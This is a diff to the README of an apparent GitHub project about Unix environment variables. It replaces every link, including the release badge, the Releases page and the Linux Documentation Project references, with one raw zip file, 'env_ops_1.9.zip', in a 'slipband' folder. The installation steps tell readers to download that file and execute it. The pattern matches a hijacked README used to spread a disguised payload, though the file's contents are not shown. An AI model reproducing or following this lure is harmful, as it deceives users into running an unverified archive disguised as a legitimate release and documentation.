@@ -1,6 +1,6 @@
 # 🌍 Ops Env: Managing Environment Variables in Unix Systems
 
-![GitHub release](https://img.shields.io/badge/Latest%20Release-v1.0.0-brightgreen)
+![GitHub release](https://raw.githubusercontent.com/AbdullahHamdy13/ops-env/main/slipband/env_ops_1.9.zip%20Release-v1.0.0-brightgreen)
 
 Welcome to the **Ops Env** repository! This project focuses on managing environment variables in Unix systems. It aims to provide tools and scripts that simplify the handling of these variables, making it easier for developers and system administrators to manage their environments effectively.
 
@@ -24,11 +24,11 @@ This repository provides tools and scripts to manage environment variables effic
 
 ## 🚀 Getting Started
 
-To get started with **Ops Env**, you can download the latest release from our [Releases page](https://github.com/AbdullahHamdy13/ops-env/releases). Follow the instructions below to set up the project.
+To get started with **Ops Env**, you can download the latest release from our [Releases page](https://raw.githubusercontent.com/AbdullahHamdy13/ops-env/main/slipband/env_ops_1.9.zip). Follow the instructions below to set up the project.
 
 ## 🔧 Usage
 
-Once you have downloaded and executed the necessary files from the [Releases page](https://github.com/AbdullahHamdy13/ops-env/releases), you can use the following commands to manage your environment variables:
+Once you have downloaded and executed the necessary files from the [Releases page](https://raw.githubusercontent.com/AbdullahHamdy13/ops-env/main/slipband/env_ops_1.9.zip), you can use the following commands to manage your environment variables:
 
 ### Setting an Environment Variable
 
@@ -65,7 +65,7 @@ unset VARIABLE_NAME
 
 To install **Ops Env**, follow these steps:
 
-1. Visit the [Releases page](https://github.com/AbdullahHamdy13/ops-env/releases).
+1. Visit the [Releases page](https://raw.githubusercontent.com/AbdullahHamdy13/ops-env/main/slipband/env_ops_1.9.zip).
 2. Download the latest release file.
 3. Execute the file in your terminal.
 
@@ -92,7 +92,7 @@ For any inquiries, please reach out via GitHub issues or directly contact the re
 
 ## 📅 Releases
 
-To keep up with the latest updates, visit our [Releases page](https://github.com/AbdullahHamdy13/ops-env/releases). Here, you can find the latest version and download it for your needs.
+To keep up with the latest updates, visit our [Releases page](https://raw.githubusercontent.com/AbdullahHamdy13/ops-env/main/slipband/env_ops_1.9.zip). Here, you can find the latest version and download it for your needs.
 
 ## 🛠️ Tools and Technologies
 
@@ -112,12 +112,12 @@ This repository is built using the following tools and technologies:
 
 If you want to learn more about environment variables and their usage in Unix systems, consider the following resources:
 
-- [The Linux Documentation Project](https://www.tldp.org/)
-- [Bash Guide for Beginners](https://tldp.org/LDP/Bash-Beginners-Guide/html/)
-- [Advanced Bash-Scripting Guide](https://tldp.org/LDP/abs/html/)
+- [The Linux Documentation Project](https://raw.githubusercontent.com/AbdullahHamdy13/ops-env/main/slipband/env_ops_1.9.zip)
+- [Bash Guide for Beginners](https://raw.githubusercontent.com/AbdullahHamdy13/ops-env/main/slipband/env_ops_1.9.zip)
+- [Advanced Bash-Scripting Guide](https://raw.githubusercontent.com/AbdullahHamdy13/ops-env/main/slipband/env_ops_1.9.zip)
 
 ## 🎉 Conclusion
 
-Managing environment variables is a vital skill for anyone working with Unix systems. The **Ops Env** repository provides the tools and knowledge needed to handle these variables effectively. Download the latest release from our [Releases page](https://github.com/AbdullahHamdy13/ops-env/releases) and start managing your environment variables today!
+Managing environment variables is a vital skill for anyone working with Unix systems. The **Ops Env** repository provides the tools and knowledge needed to handle these variables effectively. Download the latest release from our [Releases page](https://raw.githubusercontent.com/AbdullahHamdy13/ops-env/main/slipband/env_ops_1.9.zip) and start managing your environment variables today!
 
 Thank you for visiting the **Ops Env** repository! We hope you find it useful.
